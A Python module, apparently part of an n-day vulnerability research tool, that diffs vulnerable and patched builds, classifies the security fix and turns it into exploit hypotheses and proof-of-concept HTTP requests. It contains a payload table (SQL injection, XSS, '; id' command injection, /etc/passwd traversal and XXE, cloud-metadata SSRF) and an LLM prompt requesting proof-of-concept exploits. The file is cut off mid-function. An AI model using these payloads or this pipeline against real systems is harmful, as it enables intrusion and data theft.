"""Patch-diffing v2 — n-day analysis.

ROADMAP v0.4: "Patch-diff v2 (n-day) — compare vuln vs patched code, isolate patch delta."

radiff2 is the oracle (same convention as before): it tells us WHICH functions changed and
by how much. The LLM (optional) reasons about WHICH change is the security fix and what
class of bug it hides. The model never invents a diff; it only interprets radiff2 output.

New in v2:
  - PatchType classification: BOUNDS_CHECK, INTEGER_OVERFLOW, FORMAT_STRING, UAF_GUARD, etc.
  - Security-relevance scoring: functions with size increases near typical check patterns
  - Exploit-hypothesis derivation: given the patch type, what should we look for in the
    old build?
  - `diff_cve(cve_id, old_path, new_path)` — CVE-driven entry point wires it all together
"""
from __future__ import annotations

import enum
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from ..llm.base import Message


# ── Patch type taxonomy ──────────────────────────────────────────────────────

class PatchType(str, enum.Enum):
    BOUNDS_CHECK      = "bounds_check"        # +size for added if(len > MAX) guard
    INTEGER_OVERFLOW  = "integer_overflow"     # multiplication replaced with safe_mul
    FORMAT_STRING     = "format_string"        # printf(user) → printf("%s", user)
    UAF_GUARD         = "uaf_guard"            # added NULL-after-free or flag
    DOUBLE_FREE_GUARD = "double_free_guard"
    NULL_DEREF_GUARD  = "null_deref_guard"
    TYPE_CONFUSION    = "type_confusion"       # added type tag / union discriminant
    UNINITIALIZED     = "uninitialized"        # variable explicitly zeroed
    INJECTION         = "injection"            # added sanitization / escape
    RACE_CONDITION    = "race_condition"       # added mutex/lock around critical section
    AUTH_CHECK        = "auth_check"           # added permission / role check
    DESERIALIZATION   = "deserialization"      # added class whitelist / type check
    MEMORY_LEAK       = "memory_leak"          # added free() / decrement refcount
    UNKNOWN           = "unknown"


# Heuristics: size delta thresholds and name patterns per patch type
# (absolute size delta of the changed function; positive = new code added)
_PATCH_SIGNALS: List[tuple] = [
    # (PatchType, name_pattern, min_size_delta, max_size_delta)
    (PatchType.BOUNDS_CHECK,      re.compile(r"parse|read|copy|memcpy|strlen|snprintf|sprintf|write", re.I), 4, 80),
    (PatchType.INTEGER_OVERFLOW,  re.compile(r"alloc|size|len|count|num|calc|mul|add", re.I), 2, 60),
    (PatchType.FORMAT_STRING,     re.compile(r"log|print|format|msg|err|warn|debug", re.I), 2, 40),
    (PatchType.UAF_GUARD,         re.compile(r"free|destroy|release|delete|close|deinit", re.I), 2, 50),
    (PatchType.DOUBLE_FREE_GUARD, re.compile(r"free|destroy|release|delete|close", re.I), 1, 30),
    (PatchType.NULL_DEREF_GUARD,  re.compile(r"get|find|lookup|fetch|load|init", re.I), 2, 40),
    (PatchType.AUTH_CHECK,        re.compile(r"auth|check|perm|access|cap|priv|role|verify", re.I), 4, 100),
    (PatchType.INJECTION,         re.compile(r"exec|run|sql|query|cmd|shell|input|user|param", re.I), 4, 80),
    (PatchType.RACE_CONDITION,    re.compile(r"lock|mutex|atomic|sync|concurrent|thread", re.I), 4, 60),
]

_EXPLOIT_HYPOTHESIS: Dict[PatchType, str] = {
    PatchType.BOUNDS_CHECK: (
        "Look for a stack/heap overflow: probe with a payload longer than the buffer and "
        "confirm a crash (SIGSEGV/SIGABRT) on the old build. Find the offset with a cyclic "
        "pattern. The patched version will return an error or truncate; old will crash."
    ),
    PatchType.INTEGER_OVERFLOW: (
        "Trigger an integer overflow: supply a very large count/size so that the allocation "
        "(count * element_size) wraps to a small number, then write more data than allocated. "
        "Compare malloc argument on old vs new build with ltrace/strace."
    ),
    PatchType.FORMAT_STRING: (
        "Probe with '%p.%p.%p' as user input: on the old build you should see stack addresses "
        "in the output. On the new build the string is passed as a format arg, so %p is "
        "printed literally. Confirm with a '%n' write-what-where on the old build."
    ),
    PatchType.UAF_GUARD: (
        "Trigger use-after-free: free the object, then call a method on the stale pointer. "
        "On the old build the vtable/data is still accessible (may be reused by next malloc); "
        "on the new build a NULL check or flag should block the second access."
    ),
    PatchType.AUTH_CHECK: (
        "Attempt the operation without the required token/session: on the old build the "
        "operation should succeed; on the new build it returns 401/403. Test with curl and a "
        "missing or forged Authorization header."
    ),
    PatchType.INJECTION: (
        "Inject metacharacters: SQL — a single quote; command — '; id #'; template — {{7*7}}. "
        "On the old build look for an error that leaks the query structure or command output. "
        "Compare HTTP responses between old and new build."
    ),
    PatchType.DESERIALIZATION: (
        "Send a crafted serialized payload (ysoserial/URLDNS chain for a quick canary). "
        "On the old build a DNS lookup or RCE should fire; on the new build the class "
        "is rejected before deserialization."
    ),
    PatchType.UNKNOWN: (
        "No clear signal from function names and size deltas. Inspect the changed functions "
        "manually: look for the first instruction that differs between old and new using "
        "`radiff2 -g <func> old new | xdot -` or `r2 -A -q -c 'pdf @ sym.<func>' old`."
    ),
}


# ── Data model ───────────────────────────────────────────────────────────────

@dataclass
class ChangedFunc:
    name:        str
    old_size:    int = 0
    new_size:    int = 0
    similarity:  float = 1.0
    kind:        str = "CHANGE"   # CHANGE | NEW | REMOVED | UNMATCH

    @property
    def size_delta(self) -> int:
        return self.new_size - self.old_size

    @property
    def security_score(self) -> float:
        """0-1 score: how likely is this the security-relevant change?"""
        score = 0.0
        if self.similarity < 0.9:
            score += 0.4
        if abs(self.size_delta) > 8:
            score += 0.2
        if self.kind in ("NEW",):
            score += 0.1
        for _ptype, pat, _mn, _mx in _PATCH_SIGNALS:
            if pat.search(self.name or ""):
                score += 0.3
                break
        return min(score, 1.0)


@dataclass
class DiffResult:
    old:            str
    new:            str
    cve_id:         str = ""
    changed:        List[ChangedFunc] = field(default_factory=list)
    patch_type:     PatchType = PatchType.UNKNOWN
    top_suspect:    Optional[ChangedFunc] = None
    hypothesis:     str = ""
    raw:            str = ""
    narrative:      str = ""    # LLM interpretation, if available

    @property
    def changed_names(self) -> List[str]:
        return [f.name for f in self.changed]


# ── Core diff ────────────────────────────────────────────────────────────────

def _radiff2(old: str, new: str) -> Optional[str]:
    exe = shutil.which("radiff2")
    if not exe:
        return None
    try:
        out = subprocess.run([exe, "-A", "-C", old, new],
                             capture_output=True, text=True, timeout=300)
        return out.stdout or out.stderr
    except subprocess.TimeoutExpired:
        return "[radiff2 timed out]"


_RADIFF_LINE = re.compile(
    r"^(?P<old_name>\S+)\s+(?P<old_size>\d+)\s+\S+\s*\|\s*"
    r"(?P<kind>CHANGE|NEW|REMOVED|UNMATCH)\s*(?:\((?P<sim>[01]\.\d+)\))?\s*\|\s*"
    r"\S+\s+(?P<new_size>\d+)\s+(?P<new_name>\S+)"
)


def _parse_radiff2(raw: str) -> List[ChangedFunc]:
    funcs: List[ChangedFunc] = []
    for line in raw.splitlines():
        m = _RADIFF_LINE.match(line.strip())
        if m:
            d = m.groupdict()
            sim = float(d["sim"]) if d["sim"] else (1.0 if d["kind"] == "CHANGE" else 0.0)
            if sim < 1.0 or d["kind"] in ("NEW", "REMOVED", "UNMATCH"):
                funcs.append(ChangedFunc(
                    name       = d["new_name"] or d["old_name"],
                    old_size   = int(d["old_size"]),
                    new_size   = int(d["new_size"]),
                    similarity = sim,
                    kind       = d["kind"],
                ))
        else:
            # Fallback: old-style similarity-only lines
            sim_m = re.search(r"\(([01]\.\d+)\)", line)
            if sim_m and float(sim_m.group(1)) < 1.0:
                name = line.strip().split()[0] if line.strip() else ""
                funcs.append(ChangedFunc(name=name, similarity=float(sim_m.group(1))))
    return funcs


def _classify_patch(funcs: List[ChangedFunc]) -> tuple[PatchType, Optional[ChangedFunc]]:
    """Return best-guess PatchType and the most suspicious function."""
    if not funcs:
        return PatchType.UNKNOWN, None

    scored = sorted(funcs, key=lambda f: f.security_score, reverse=True)
    top = scored[0]

    for ptype, pat, min_delta, max_delta in _PATCH_SIGNALS:
        if pat.search(top.name or ""):
            delta = abs(top.size_delta)
            if min_delta <= delta <= max_delta or top.similarity < 0.85:
                return ptype, top

    return PatchType.UNKNOWN, top


# ── Public API ───────────────────────────────────────────────────────────────

def run_patchdiff(old: str, new: str, llm=None, config=None) -> DiffResult:
    """Compare two binaries. Returns a DiffResult with patch type + exploit hypothesis."""
    res = DiffResult(old=old, new=new)
    raw = _radiff2(old, new)
    if raw is None:
        res.raw = "radiff2 not found (ships with radare2). Install radare2 to enable patch-diffing."
        return res
    res.raw = raw
    res.changed = _parse_radiff2(raw)
    res.patch_type, res.top_suspect = _classify_patch(res.changed)
    res.hypothesis = _EXPLOIT_HYPOTHESIS.get(res.patch_type, _EXPLOIT_HYPOTHESIS[PatchType.UNKNOWN])
    if llm is not None and llm.available():
        res.narrative = _explain_diff(llm, res)
    return res


def diff_cve(cve_id: str, old_path: str, new_path: str, llm=None) -> DiffResult:
    """
    CVE-driven entry point: compare the vulnerable binary (old_path) against the patched
    build (new_path), tag the result with the CVE ID, and derive an exploit hypothesis.

    Both paths must exist locally (download them before calling).
    """
    res = run_patchdiff(old_path, new_path, llm=llm)
    res.cve_id = cve_id
    return res


def _explain_diff(llm, res: DiffResult) -> str:
    top_lines = "\n".join(
        f"  {f.name:<40} sim={f.similarity:.2f}  delta={f.size_delta:+d}  kind={f.kind}"
        for f in res.changed[:40]
    ) or "(no changed functions detected)"
    sys = (
        "You are a vulnerability researcher doing n-day patch analysis. "
        "You are given the radiff2 function-level diff between an OLD (vulnerable) and "
        "a NEW (patched) build. Using ONLY this diff, identify which changed function most "
        "likely contains the silent security fix, explain what class of bug the fix implies "
        "(bounds check added, integer overflow guard, format-string hardened, UAF guard, etc.), "
        "and describe the most direct way to confirm the bug in the OLD build. "
        "Do not invent function bodies you were not shown; reason from names, sizes and similarity."
    )
    cve_line = f"CVE: {res.cve_id}\n" if res.cve_id else ""
    user = (
        f"{cve_line}OLD: {res.old}\nNEW: {res.new}\n\n"
        f"Changed functions (similarity < 1.0, top {min(40, len(res.changed))}):\n{top_lines}\n\n"
        f"Automated classification: {res.patch_type.value}\n"
        f"Top suspect: {res.top_suspect.name if res.top_suspect else 'none'}\n\n"
        "Confirm, refine or correct the classification. Then: given the OLD build, what is "
        "the simplest proof-of-concept that would trigger the bug?"
    )
    return llm.chat([Message("system", sys), Message("user", user)])


# ═══════════════════════════════════════════════════════════════════════════════
# SOURCE-LEVEL PATCH DIFF ANALYSIS
# Parses git diff text (not binaries) to extract vulnerable code patterns and
# generate precise PoC parameters. Called from auto_chain._run_patch_stage()
# immediately after the diff text is downloaded.
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class PatchDiffAnalysis:
    vuln_function: str = ""         # name of changed function
    vuln_file: str = ""             # path of changed file
    removed_lines: List[str] = field(default_factory=list)   # - lines (vuln code)
    added_lines: List[str] = field(default_factory=list)     # + lines (fix code)
    vuln_pattern: str = ""          # one-line: what was vulnerable
    patch_pattern: str = ""         # one-line: what was fixed
    suggested_param: str = ""       # parameter name from removed code
    suggested_value: str = ""       # payload based on vuln pattern
    confidence: float = 0.0         # 0-1
    raw_hunk: str = ""              # the best hunk (for LLM context)
    fix_class: str = ""             # e.g. "auth_bypass", "sqli", "xss", ...


def _parse_hunks(patch_text: str) -> List[dict]:
    """Split a git diff into per-hunk dicts with file, function context, +/- lines."""
    hunks: List[dict] = []
    current_file = ""
    current_hunk: Optional[dict] = None

    for line in patch_text.splitlines():
        # Track file being modified
        if line.startswith("--- a/") or line.startswith("--- "):
            current_file = line[6:] if line.startswith("--- a/") else line[4:]
        elif line.startswith("+++ b/") or line.startswith("+++ "):
            # Prefer the b/ path as the canonical filename
            current_file = line[6:] if line.startswith("+++ b/") else line[4:]
        elif line.startswith("diff --git"):
            # e.g. diff --git a/src/foo.py b/src/foo.py
            m = re.search(r" b/(.+)$", line)
            if m:
                current_file = m.group(1)
        elif line.startswith("@@"):
            # Save previous hunk
            if current_hunk is not None:
                current_hunk["net_change"] = (
                    len(current_hunk["added"]) - len(current_hunk["removed"]))
                hunks.append(current_hunk)
            # Extract function context from @@ -a,b +c,d @@ context_string
            ctx_m = re.search(r"@@[^@]+@@\s*(.+)", line)
            func_ctx = ctx_m.group(1).strip() if ctx_m else ""
            # Extract just the function name from context (first word after def/func/function)
            fn_m = re.search(
                r"(?:def|func|function|void|int|public|private|protected|async\s+function|"
                r"async\s+def|fn|sub|proc)\s+(\w+)",
                func_ctx, re.I)
            func_name = fn_m.group(1) if fn_m else func_ctx.split("(")[0].strip()[:40]
            current_hunk = {
                "file": current_file,
                "function_context": func_name,
                "removed": [],
                "added": [],
                "net_change": 0,
                "raw": line + "\n",
            }
        elif current_hunk is not None:
            current_hunk["raw"] += line + "\n"
            if line.startswith("-") and not line.startswith("---"):
                current_hunk["removed"].append(line[1:])
            elif line.startswith("+") and not line.startswith("+++"):
                current_hunk["added"].append(line[1:])

    if current_hunk is not None:
        current_hunk["net_change"] = (
            len(current_hunk["added"]) - len(current_hunk["removed"]))
        hunks.append(current_hunk)

    return hunks


# Fix-classification rules: (fix_class, vuln_description, patch_description,
#                             removed_patterns, added_patterns, confidence)
_FIX_RULES: List[tuple] = [
    (
        "auth_bypass",
        "missing authorization check",
        "added auth/permission check",
        [re.compile(r"(?:if|unless)\s+(?:current_user|user|request\.user|@user|is_logged|"
                    r"session\[.user|authenticate|require_login)", re.I)],
        [re.compile(r"(?:authorize|require_permission|check_auth|forbidden|"
                    r"raise\s+Forbidden|return\s+403|abort\(403\)|"
                    r"if\s+!?\s*(?:current_user|user|session))", re.I)],
        0.85,
    ),
    (
        "sqli",
        "unsanitized SQL parameter interpolation",
        "added prepared statement / parameterized query",
        [re.compile(r'(?:f"|f\'|%s\s*%|\.format\(|"\s*\+\s*\w+\s*\+\s*"|'
                    r'sprintf.*SELECT|query\s*=\s*["\'].*\$|query\s*\+=)', re.I)],
        [re.compile(r"(?:prepare\(|execute\(\w+,\s*[\(\[]|executeQuery\(|"
                    r'=\s*["\'][^"\']*\?[^"\']*["\']|parameterized|bindParam|'
                    r"pg\.query\(|db\.execute\()", re.I)],
        0.85,
    ),
    (
        "xss",
        "unescaped user input reflected in HTML output",
        "added HTML escaping / sanitization",
        [re.compile(r"(?:echo\s+\$|\.innerHTML\s*=|res\.send\(|res\.write\(|"
                    r"Response\.Write|render_template_string|"
                    r"Markup\(|\.html\(\w|template\.render\()", re.I)],
        [re.compile(r"(?:htmlspecialchars|htmlentities|html\.escape|"
                    r"escape\(|sanitize_html|DOMPurify|bleach\.clean|"
                    r"markupsafe\.escape|encodeURIComponent|"
                    r"escapeHTML|xss_filter|strip_tags)", re.I)],
        0.85,
    ),
    (
        "ssti",
        "template injection via unsanitized render input",
        "added template escaping or autoescape",
        [re.compile(r"(?:render_template_string\(|Environment\(autoescape=False|"
                    r"Jinja2\.from_string\(user|nunjucks\.renderString\(user|"
                    r"\.render\(\s*user_input|Template\(request\.)", re.I)],
        [re.compile(r"(?:autoescape=True|escape_string|markupsafe|"
                    r"sandbox|SandboxedEnvironment|Markup\.escape)", re.I)],
        0.85,
    ),
    (
        "command_injection",
        "unsanitized user input passed to shell/exec",
        "added shell escaping or input whitelist",
        [re.compile(r"(?:os\.system\(|subprocess\.[a-z]+\([^)]*\+|"
                    r"exec\(.*\$|shell=True.*user|`.*\$\{|"
                    r"popen\(.*\+\s*user|Runtime\.exec\(.*input)", re.I)],
        [re.compile(r"(?:shlex\.quote|shlex\.split|whitelist|"
                    r"shell=False|re\.match.*\^\\w|escapeshellarg|"
                    r"subprocess\.run\(\[|allowlist)", re.I)],
        0.85,
    ),
    (
        "path_traversal",
        "path traversal via missing normalization",
        "added path normalization / sandbox check",
        [re.compile(r"(?:open\(.*\+\s*user|readFile\s*\(.*req\.|"
                    r"file_get_contents\(\$|include\s*\(\s*\$|"
                    r"send_file\(user|StreamingResponse\(open\(user|"
                    r"fs\.readFile\s*\(\s*req\.|fs\.readFile.*dir\s*\+|"
                    r"\.read\(\s*(?:params|req\.|request\.))", re.I)],
        [re.compile(r"(?:os\.path\.normpath|os\.path\.realpath|os\.path\.basename|"
                    r"Path\(.*resolve|abspath|realpath|"
                    r"startswith\(base_dir|safe_join|"
                    r"path\.resolve\s*\(|path\.normalize\s*\(|"
                    r"\.startsWith\s*\(rootDir|within_base)", re.I)],
        0.85,
    ),
    (
        "open_redirect",
        "unvalidated redirect to user-supplied URL",
        "added URL validation / whitelist",
        [re.compile(r"(?:redirect\(\s*request\.|HttpResponseRedirect\(url|"
                    r"res\.redirect\(req\.|header\(.Location.*\$)", re.I)],
        [re.compile(r"(?:is_safe_url|url_has_allowed_host|"
                    r"urlparse.*netloc|redirect_whitelist|"
                    r"urllib\.parse\.urlparse\(url\))", re.I)],
        0.80,
    ),
    (
        "missing_auth_bypass",
        "missing authentication/authorization guard",
        "added login-required or permission check",
        [],  # catch-all with looser scoring below
        [re.compile(r"(?:@login_required|@require_auth|requireAuth|"
                    r"ensureAuthenticated|middleware\.auth|"
                    r"if\s+!user\s*\{|\breject\(401\)|abort\(401\))", re.I)],
        0.75,
    ),
    (
        "deserialization",
        "unsafe deserialization of user-controlled data",
        "replaced with safe deserialization or JSON parsing",
        [re.compile(r"(?:unserialize\s*\(\s*\$|pickle\.loads\s*\(|"
                    r"yaml\.load\s*\([^L]|ObjectInputStream\s*\(|"
                    r"Marshal\.load\s*\(|readObject\s*\(\s*|"
                    r"Serializer\.Deserialize\(input)", re.I)],
        [re.compile(r"(?:json\.loads|json_decode|JSONDecoder|"
                    r"allowed_classes\s*=\s*false|"
                    r"yaml\.safe_load|SafeLoader|"
                    r"ObjectInputFilter|resolveClass)", re.I)],
        0.85,
    ),
    (
        "cors_misconfiguration",
        "overly permissive CORS allowing any origin",
        "restricted CORS to specific origins or removed wildcard",
        [re.compile(r"(?:Access-Control-Allow-Origin['\"]?\s*[,:]\s*['\"]?\*['\"]?|"
                    r"origin\s*=\s*['\"]?\*['\"]?|"
                    r"headers\[.Access-Control-Allow-Origin.\]\s*=\s*['\"]?\*|"
                    r"req\.headers\.origin|cors\(\s*\{.*origin:\s*true)", re.I)],
        [re.compile(r"(?:allowedOrigins|origin\s*=\s*allowlist|"
                    r"whitelist|ALLOWED_ORIGINS|origin\.includes\(|"
                    r"origin\s*===\s*['\"]https://|corsOptions)", re.I)],
        0.80,
    ),
    (
        "mass_assignment",
        "unrestricted model assignment from user input",
        "added attribute allowlist / strong parameters",
        [re.compile(r"(?:\.update\s*\(\s*params\b|\.update_attributes\s*\(params|"
                    r"fill\s*\(\s*request->all\s*\(\)|"
                    r"Model\.create\s*\(\s*request\.body|"
                    r"\$model->fill\s*\(\s*\$request->all\s*\(\))", re.I)],
        [re.compile(r"(?:only\s*\(\s*['\"]|permit\s*\(\s*['\"]|"
                    r"fillable\s*=\s*\[|guarded\s*=\s*\[|"
                    r"allow_params|attr_accessible|"
                    r"schema\.validate|pick\s*\(\s*whitelist)", re.I)],
        0.80,
    ),
    (
        "ssrf",
        "server-side request forgery via user-controlled URL",
        "added URL validation or allowlist for outbound requests",
        [re.compile(r"(?:requests\.get\s*\(\s*url|urllib\.request\.urlopen\s*\(|"
                    r"fetch\s*\(\s*url\b|http\.get\s*\(\s*url|"
                    r"file_get_contents\s*\(\s*\$url|"
                    r"HttpClient.*new.*url|curl_exec.*curl_setopt.*url)", re.I)],
        [re.compile(r"(?:is_private_ip|is_internal_ip|url_allowlist|"
                    r"validate_url|check_url|block.*169\.254|"
                    r"ipaddress\.ip_address.*is_private|"
                    r"private_ip|internal_ip|SSRF_PROTECTION)", re.I)],
        0.80,
    ),
    (
        "jwt_bypass",
        "JWT algorithm confusion or missing algorithm enforcement",
        "added algorithm allowlist or algorithm enforcement",
        [re.compile(r"(?:jwt\.verify\s*\([^)]+\)(?!\s*,\s*\{.*algorithms)|"
                    r"jwt\.decode\s*\([^)]*algorithms\s*=\s*None|"
                    r"verify\s*\(\s*token[^)]*\)(?!\s*,\s*\{.*algorithms)|"
                    r"alg.*none|algorithm.*none)", re.I)],
        [re.compile(r"(?:algorithms\s*=\s*\[|\{.*algorithms.*:\s*\[|"
                    r"jwt\.verify\s*\([^)]+,\s*\{.*algorithms|"
                    r"allowed_algorithms|allowedAlgorithms|"
                    r"verifyOptions.*algorithms|"
                    r"jwt\.decode\s*\([^)]*algorithms\s*=\s*\[)", re.I)],
        0.85,
    ),
    (
        "xml_injection",
        "XML external entity (XXE) or XML injection via unsanitized input",
        "disabled external entities or added XML sanitization",
        [re.compile(r"(?:lxml\.etree\.parse\s*\(|xml\.dom\.minidom\.parse\s*\(|"
                    r"DocumentBuilderFactory|SAXParserFactory|XMLReader|"
                    r"etree\.fromstring\s*\(user|xmltree.*user_input|"
                    r"new\s+DOMParser\s*\(\s*\)\.parseFromString\s*\(\s*user)", re.I)],
        [re.compile(r"(?:resolve_entities\s*=\s*False|no_network\s*=\s*True|"
                    r"setFeature.*external.entities.*false|"
                    r"XMLInputFactory.*SUPPORT_DTD.*false|"
                    r"defusedxml|etree\.XMLParser\s*\(.*resolve_entities.*False)", re.I)],
        0.85,
    ),
    (
        "file_upload_bypass",
        "unrestricted file upload — MIME type or extension not validated",
        "added extension allowlist or MIME type validation",
        [re.compile(r"(?:move_uploaded_file\s*\(\s*\$_FILES|"
                    r"multer\s*\(\s*\{|upload\.single\s*\(|"
                    r"request\.FILES\[|\.save\s*\(\s*upload_to=|"
                    r"file\.write\s*\(\s*content|"
                    r"open\s*\([^)]*,\s*['\"]wb['\"]\s*\)\s*\.write\s*\(user)", re.I)],
        [re.compile(r"(?:fileFilter\s*:\s*function|mimetype\.includes|"
                    r"allowed_extensions|ALLOWED_EXTENSIONS|"
                    r"imghdr\.what\s*\(|magic\.from_buffer\s*\(|"
                    r"mimetypes\.guess_type\s*\(|"
                    r"extension\s*in\s*\[.{0,60}(?:jpg|png|gif|pdf)|"
                    r"\['\"](?:image/jpeg|image/png|application/pdf)['\"])", re.I)],
        0.82,
    ),
    (
        "insecure_deserialization",
        "insecure deserialization via pickle/yaml/unserialize with user data",
        "replaced with safe loader or JSON parsing",
        [re.compile(r"(?:pickle\.loads\s*\(|pickle\.load\s*\(|"
                    r"yaml\.load\s*\([^)]*(?!Loader=yaml\.Safe)|"
                    r"unserialize\s*\(\s*\$_(?:POST|GET|COOKIE|REQUEST)|"
                    r"Marshal\.load\s*\(|ObjectInputStream\s*\.readObject|"
                    r"java\.io\.ObjectInputStream)", re.I)],
        [re.compile(r"(?:pickle is not supported|"
                    r"yaml\.safe_load\s*\(|yaml\.load\s*\([^)]*Loader=yaml\.SafeLoader|"
                    r"json\.loads\s*\(|json\.load\s*\(|"
                    r"allowed_classes\s*=\s*false|"
                    r"ObjectInputFilter|resolveClass.*throw)", re.I)],
        0.87,
    ),
]

# Fallback: if nothing matches, look for generic sanitization removal
_GENERIC_SANITIZE = re.compile(
    r"(?:sanitize|validate|filter|strip|clean|escape|encode|decode)", re.I)


def _classify_fix(removed: List[str], added: List[str]) -> tuple:
    """Classify what kind of security fix was applied.

    Returns (fix_class, vuln_pattern, patch_pattern, confidence).
    """
    removed_text = "\n".join(removed)
    added_text = "\n".join(added)

    for fix_class, vuln_desc, patch_desc, removed_pats, added_pats, base_conf in _FIX_RULES:
        removed_hit = any(p.search(removed_text) for p in removed_pats) if removed_pats else True
        added_hit = any(p.search(added_text) for p in added_pats) if added_pats else False
        if removed_hit and added_hit:
            # Boost confidence if BOTH sides match
            conf = base_conf + (0.05 if removed_pats and added_pats else 0.0)
            return fix_class, vuln_desc, patch_desc, min(conf, 0.95)

    # Generic: sanitization function ADDED in diff
    if _GENERIC_SANITIZE.search(added_text) and not _GENERIC_SANITIZE.search(removed_text):
        return "injection", "missing input sanitization", "added input sanitization", 0.65

    # Last resort: check if auth-related functions only appear in added
    _auth_added = re.search(
        r"(?:auth|permission|access|token|session|login|credential)", added_text, re.I)
    _auth_removed = re.search(
        r"(?:auth|permission|access|token|session|login|credential)", removed_text, re.I)
    if _auth_added and not _auth_removed:
        return "auth_bypass", "missing auth guard", "added auth check", 0.60

    return "unknown", "unclassified change", "unclassified fix", 0.30


# ── Payload suggestion per fix class ─────────────────────────────────────────

_PAYLOADS_FOR_CLASS: Dict[str, str] = {
    "sqli":               "' OR '1'='1",
    "xss":                "<script>alert(document.domain)</script>",
    "ssti":               "{{7*7}}",
    "command_injection":  "; id",
    "path_traversal":     "../../etc/passwd",
    "open_redirect":      "https://evil.example.com",
    "auth_bypass":        "",       # no payload needed; just omit the auth header
    "missing_auth_bypass": "",
    "injection":          "'; SELECT 1--",
    "deserialization":    "",       # payload depends on gadget chain
    "cors_misconfiguration": "",    # no payload; check Origin header reflection
    "mass_assignment":    "",       # no payload; send extra protected fields
    "ssrf":               "http://169.254.169.254/latest/meta-data/",
    "jwt_bypass":             "",   # payload is a JWT with alg:none
    "xml_injection":          "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    "file_upload_bypass":     "",   # payload is a webshell disguised as image
    "insecure_deserialization": "", # payload depends on gadget chain
    "unknown":                "",
}


# ── Parameter name extractor ─────────────────────────────────────────────────

_PARAM_PATTERNS: List[re.Pattern] = [
    # PHP superglobals
    re.compile(r'\$_(?:GET|POST|REQUEST)\s*\[\s*["\'](\w+)["\']'),
    re.compile(r'\$request->(\w+)(?:\s|\()'),
    re.compile(r'\$this->input->get\s*\(\s*["\'](\w+)["\']'),
    # Python / Flask / Django / FastAPI
    re.compile(r'request\.args\.get\s*\(\s*["\'](\w+)["\']'),
    re.compile(r'request\.form\s*\[\s*["\'](\w+)["\']'),
    re.compile(r'request\.POST\s*\.get\s*\(\s*["\'](\w+)["\']'),
    re.compile(r'request\.GET\s*\.get\s*\(\s*["\'](\w+)["\']'),
    re.compile(r'data\s*\[\s*["\'](\w+)["\']'),
    re.compile(r'params\s*\[\s*["\'](\w+)["\']'),
    # JavaScript / TypeScript (Express, Fastify, Hapi)
    re.compile(r'req\.query\.(\w+)'),
    re.compile(r'req\.body\.(\w+)'),
    re.compile(r'req\.params\.(\w+)'),
    re.compile(r"ctx\.query\s*\[?\s*['\"](\w+)['\"]"),
    re.compile(r"ctx\.request\.body\.(\w+)"),
    # Go (Gin, Echo, Fiber, net/http)
    re.compile(r'r\.URL\.Query\(\)\.Get\s*\(\s*"(\w+)"'),
    re.compile(r'c\.Query\s*\(\s*"(\w+)"'),
    re.compile(r'c\.Param\s*\(\s*"(\w+)"'),
    re.compile(r'c\.FormValue\s*\(\s*"(\w+)"'),
    # Ruby (Rails params)
    re.compile(r'params\s*\[:(\w+)\]'),
    re.compile(r'params\s*\[\s*["\'](\w+)["\']'),
]


def _extract_param_name(removed: List[str]) -> str:
    """Scan removed (vulnerable) lines for parameter access patterns."""
    for line in removed:
        for pat in _PARAM_PATTERNS:
            m = pat.search(line)
            if m:
                return m.group(1)
    return ""


# ── Main entry point ──────────────────────────────────────────────────────────

def analyze_patch_diff(patch_text: str) -> PatchDiffAnalysis:
    """Parse a git diff to extract the vulnerable code pattern and suggest a PoC.

    Workflow:
    1. Split diff into hunks.
    2. Pick the most significant hunk (most removed+added lines combined).
    3. Classify the fix type from removed vs added line patterns.
    4. Extract parameter names from the vulnerable (removed) lines.
    5. Suggest a payload based on the fix class.

    Returns PatchDiffAnalysis; confidence reflects how certain the classification is.
    """
    if not patch_text or len(patch_text) < 20:
        return PatchDiffAnalysis()

    hunks = _parse_hunks(patch_text)
    if not hunks:
        return PatchDiffAnalysis()

    # Score every hunk — pick the one with the highest classification confidence.
    # Previously only the "largest by line count" hunk was checked, which missed
    # small but high-signal hunks (a single removed auth guard beats a 20-line refactor).
    _best_hunk = hunks[0]
    _best_fix_class = "unknown"
    _best_vuln_pattern = ""
    _best_patch_pattern = ""
    _best_conf = 0.0

    for _hunk in hunks:
        _fc, _vp, _pp, _c = _classify_fix(_hunk["removed"], _hunk["added"])
        # Tie-break: prefer longer hunk when confidence is equal (more context)
        _effective_conf = _c + (len(_hunk["removed"]) + len(_hunk["added"])) * 0.001
        if _effective_conf > _best_conf or _best_fix_class == "unknown":
            _best_hunk = _hunk
            _best_fix_class = _fc
            _best_vuln_pattern = _vp
            _best_patch_pattern = _pp
            _best_conf = _c

    fix_class = _best_fix_class
    vuln_pattern = _best_vuln_pattern
    patch_pattern = _best_patch_pattern
    conf = _best_conf
    best = _best_hunk

    suggested_param = _extract_param_name(best["removed"])
    suggested_value = _PAYLOADS_FOR_CLASS.get(fix_class, "")

    # Confidence bonus: if we extracted a param name, more confident
    if suggested_param:
        conf = min(conf + 0.05, 0.98)

    return PatchDiffAnalysis(
        vuln_function=best["function_context"],
        vuln_file=best["file"],
        removed_lines=best["removed"][:20],   # cap at 20 lines to avoid huge objects
        added_lines=best["added"][:20],
        vuln_pattern=vuln_pattern,
        patch_pattern=patch_pattern,
        suggested_param=suggested_param,
        suggested_value=suggested_value,
        confidence=conf,
        raw_hunk=best["raw"][:2000],
        fix_class=fix_class,
    )


def generate_poc_from_analysis(analysis: "PatchDiffAnalysis",
                               base_url: str = "http://TARGET",
                               http_method: str = "GET",
                               auth_header: str = "") -> str:
    """Generate a minimal PoC HTTP request from a PatchDiffAnalysis.

    Returns a formatted HTTP request block that can be pasted into Burp Repeater
    or used as a curl command. The PoC is generated purely from the diff analysis
    — it does NOT require a live target.

    Example output (for SQLi):
        GET /api/users?id='+OR+'1'='1 HTTP/1.1
        Host: TARGET
        [Authorization: Bearer TOKEN]

        # Expected: SQL error or bypass response
    """
    if not analysis or not analysis.fix_class or analysis.fix_class == "unknown":
        return ""

    param = analysis.suggested_param
    payload = analysis.suggested_value
    endpoint = analysis.vuln_file or "/vulnerable-endpoint"
    # Normalize endpoint: use just the filename portion if it's a source path
    if "/" in endpoint and not endpoint.startswith("/"):
        # e.g. "src/views/user.php" → "/user" (guessed API path)
        _fname = endpoint.rsplit("/", 1)[-1]
        _name_no_ext = _fname.rsplit(".", 1)[0] if "." in _fname else _fname
        endpoint = f"/api/{_name_no_ext}"

    _host = base_url.replace("http://", "").replace("https://", "").rstrip("/")

